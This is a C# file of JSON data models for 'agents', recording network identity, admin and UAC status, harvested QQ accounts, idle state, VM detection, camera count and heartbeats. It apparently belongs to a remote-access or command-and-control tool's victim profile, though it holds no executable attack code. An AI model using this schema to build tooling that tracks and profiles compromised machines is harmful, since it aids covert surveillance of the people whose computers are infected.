using System.Text.Json;
using System.Text.Json.Serialization;

namespace Libra.Virgo.Models;

public class AgentInfo
{
    [JsonPropertyName("agentId")]
    public Guid AgentId { get; set; }

    [JsonPropertyName("network")]
    public NetworkEndpoint Network { get; set; } = new();

    [JsonPropertyName("location")]
    public string Location { get; set; } = "";

    [JsonPropertyName("processName")]
    public string ProcessName { get; set; } = "";

    [JsonPropertyName("privilege")]
    public PrivilegeInfo Privilege { get; set; } = new();

    [JsonPropertyName("qqAccounts")]
    public List<string> QQAccounts { get; set; } = new();

    [JsonPropertyName("osVersion")]
    public string OsVersion { get; set; } = "";

    [JsonPropertyName("bootTime")]
    public DateTime? BootTime { get; set; }

    [JsonPropertyName("startTime")]
    public DateTime? StartTime { get; set; }

    [JsonPropertyName("lastActiveTime")]
    public DateTime? LastActiveTime { get; set; }

    [JsonPropertyName("isIdle")]
    public bool IsIdle { get; set; }

    [JsonPropertyName("hardware")]
    public HardwareInfo Hardware { get; set; } = new();

    [JsonExtensionData]
    public Dictionary<string, JsonElement> Extensions { get; set; } = new();

    [JsonPropertyName("lastHeartbeat")]
    public DateTime? LastHeartbeat { get; set; }
}

public class NetworkEndpoint
{
    [JsonPropertyName("ip")] public string Ip { get; set; } = "";
    [JsonPropertyName("port")] public int Port { get; set; }
    [JsonPropertyName("mac")] public string MacAddress { get; set; } = "";
    [JsonPropertyName("hostname")] public string Hostname { get; set; } = "";
    [JsonPropertyName("username")] public string Username { get; set; } = "";
}

public class PrivilegeInfo
{
    [JsonPropertyName("isAdmin")] public bool IsAdmin { get; set; }
    [JsonPropertyName("uacEnabled")] public bool? UacEnabled { get; set; }
    [JsonPropertyName("macStatus")] public string? MandatoryAccessControl { get; set; }
}

public class HardwareInfo
{
    [JsonPropertyName("cpu")] public CpuInfo Cpu { get; set; } = new();
    [JsonPropertyName("gpus")] public string[] Gpus { get; set; } = [];
    [JsonPropertyName("memory")] public float Memory { get; set; }
    [JsonPropertyName("disks")] public List<object> Disks { get; set; } = new();
    [JsonPropertyName("isVirtualMachine")] public bool IsVirtualMachine { get; set; }
    [JsonPropertyName("vmType")] public string? VmType { get; set; }
    [JsonPropertyName("cameras")] public int[] Cameras { get; set; }
}

public class CpuInfo
{
    [JsonPropertyName("name")] public string? Name { get; set; }
    [JsonPropertyName("cores")] public int Cores { get; set; }
}